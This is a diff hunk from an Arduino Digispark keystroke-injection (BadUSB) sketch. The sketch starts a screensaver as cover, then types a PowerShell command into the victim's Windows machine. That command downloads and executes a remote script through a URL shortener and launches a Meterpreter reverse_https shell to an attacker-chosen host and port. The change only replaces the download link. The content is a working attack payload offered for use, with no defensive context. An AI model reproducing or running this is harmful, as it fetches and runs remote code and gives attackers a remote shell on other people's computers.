@@ -47,7 +47,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("start C:/Windows/System32/Ribbons.scr /s");
   DigiKeyboard.delay(250);
-  DigiKeyboard.println("powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <IP_ADDRESS> -Lport <PORT> -Force""); // Edit both Lhost and Lport according to your setup
+  DigiKeyboard.println("powershell "IEX (New-Object Net.WebClient).DownloadString('https://rb.gy/tpyrpt'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <IP_ADDRESS> -Lport <PORT> -Force""); // Edit both Lhost and Lport according to your setup
   DigiKeyboard.delay(250);
   DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // Save the file and return to cmd shell use delay of 500ms
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
